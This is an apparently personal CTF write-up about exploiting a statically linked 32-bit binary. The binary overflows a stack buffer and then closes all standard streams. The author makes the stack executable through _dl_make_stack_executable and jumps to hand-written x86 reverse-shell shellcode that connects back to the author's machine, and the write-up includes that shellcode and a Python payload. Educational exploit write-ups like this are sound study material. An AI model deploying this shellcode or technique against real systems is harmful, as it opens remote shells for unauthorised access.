

The challenge gives us a file without libc

Running it

![](https://hackmd.io/_uploads/BkkwUBRqn.png)

The program gets an input then ends

Debuging with gdb

`main`

```
Dump of assembler code for function main:
   0x0804887c <+0>:     push   ebp
   0x0804887d <+1>:     mov    ebp,esp
   0x0804887f <+3>:     sub    esp,0x8
   0x08048882 <+6>:     push   0x64
   0x08048884 <+8>:     lea    eax,[ebp-0x8]
   0x08048887 <+11>:    push   eax
   0x08048888 <+12>:    push   0x0
   0x0804888a <+14>:    call   0x806d180 <read>
   0x0804888f <+19>:    add    esp,0xc
   0x08048892 <+22>:    push   0x0
   0x08048894 <+24>:    call   0x806d330 <close>
   0x08048899 <+29>:    add    esp,0x4
   0x0804889c <+32>:    push   0x1
   0x0804889e <+34>:    call   0x806d330 <close>
   0x080488a3 <+39>:    add    esp,0x4
   0x080488a6 <+42>:    push   0x2
   0x080488a8 <+44>:    call   0x806d330 <close>
   0x080488ad <+49>:    add    esp,0x4
   0x080488b0 <+52>:    mov    eax,0x0
   0x080488b5 <+57>:    leave
   0x080488b6 <+58>:    ret
```

* So it `read` `0x64` bytes from `sdtin`, stores result in `ebp - 0x8` and call `close(stdin)`, `close(stdout)`, `close(stderr)`

Checksec

![](https://hackmd.io/_uploads/rJ9zvS0q2.png)

Check for process mapping then i see that it doesn't use libc

![](https://hackmd.io/_uploads/S1hSDrR5h.png)


* Then decompile the program with `ida` i see that many functions in libc is in the program. In other word, this program is a libc. But it doesn't have some functions tho
* Since it `close` all standard file stream, we can't interact with it even if we can get a shell. So the idea is using `reverse-shell`
* So i write `reverse-shell shellcode` to stack then executes it

## Make stack executable

Basically the first thing i have to do is making the stack executable

* First i tried to use `mprotect` syscall but it didn't work, then i figured out that the address passed to that has to be `AND` with `0xfffff000`. Even i can make the address align like that but it takes too many gadgets
* Then i found out there's a function that make stack executable for me. It's call `_dl_make_stack_executable`.

```cpp=
unsigned int __usercall dl_make_stack_executable@<eax>(_DWORD *a1@<eax>)
{
  unsigned int result; // eax

  if ( *a1 != _libc_stack_end )
    return 1;
  result = mprotect(*a1 & -dl_pagesize, dl_pagesize);
  if ( result )
    return *(_DWORD *)(__readgsdword(0) - 24);
  *a1 = 0;
  dl_stack_flags |= 1u;
  return result;
}
```

* To make it work, the argument must be `_libc_stack_end`, then it call `mprotect` with `prot` is stored in a global variable called `__stack_prot`. First `__stack_prot` contain `0x100000`

![](https://hackmd.io/_uploads/BJ7VoBC93.png)

* So i have to change it to `0x7` (PROT_READ | PROT_WRITE | PROT_EXEC)

```cpp=
#define	PROT_READ	 0x04	/* Pages can be read.  */
#define	PROT_WRITE	 0x02	/* Pages can be written.  */
#define	PROT_EXEC	 0x01	/* Pages can be executed.  */
```

So after making stack executable, i use `jmp esp` to jump to my `reverse-shell shellcode`

## Reverse-shell

You can see [this](https://smarinovic.github.io/posts/Reverse-shell/) for more infomations about `reverse-shell`

* Some syscall i use to create a `reverse-shell`. See [here](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit) for syscall number
```
execve   0xb         //to execute('/bin/sh')
socket   0x167       //to create socket
connect  0x16a       //to connect to our machine
dup2     0x3f        //redirect file stream to socket  
```
* First i wonder if i can use `dup2` with a closed file stream. Reading document for `dup2`

>If the file descriptor newfd was previously open, it is closed
       before being reused; the close is performed silently (i.e., any
       errors during the close are not reported by dup2()).

* `dup2` will `close` the file stream anyway so it's okay

* So my `revese-shell` will be like this after trying to minimize the size

```

//socket(AF_INET, SOCK_STREAM, 0)
push 2
pop ebx                ;ebx = AF_INET for ipv4
push 1
pop ecx                ;ecx = SOCK_STREAM for tcp protocol
push eax
pop edx                ;edx = 0 for ip protocol
mov ax, 0x167 
int 0x80

//eax is now socket file descriptor

//connect(socket, struct sockaddr_in, len)                 
mov edi, eax          ;store the socket in edi to reuse
//create struct on stack
push ebp              ;ip address 
push  {}0002          ;port and AF_INET
mov ecx, esp          ;sockaddr struct
mov ebx, edi          ;ebx = socket
mov dl, 0x10          ;size of (struct sockaddr_in)
mov ax, 0x16a
int 0x80


//dup2(socket, stdin)
mov al, 0x3f
xor ecx, ecx           ;ecx = 0(stdin), ebx is already socket
int 0x80

//dup2(socket, stdout)
mov eax, 0x3f
mov ebx, edi           ;ebx = socket
mov ecx, 1             ;ecx = stdout
int 0x80

//i don't dup2(socket, stderr) here because we don't need it, but it you like you can do it



//execve('/bin/sh')
mov eax, 0xb
push 0x68732f
push 0x6e69622f
mov ebx, esp           ;ebx -> /bin/sh
mov ecx, 0    
mov edx, 0
int 0x80
```


* The problem rises when the payload's length is over `100`. So far to `socket(socket, stdout)` it's okay, i decided to make a `read` syscall after `dup2(socket, stdin)` and continue my shellcode by that `read`
* So in server side it has to send the remained shellcode
* Calculate the distance between `esp` and `eip` to write shellcode at right place

![](https://hackmd.io/_uploads/BkOS-I092.png)

* So my payload will be like

```python=
b'A'*0x3c + shell
```

Running it

![](https://hackmd.io/_uploads/SkJsZIR9n.png)

Success get a shell in the program

Checking in server side

![](https://hackmd.io/_uploads/B12nbIAch.png)

It works but i don't have any server to check if my solution is true. 
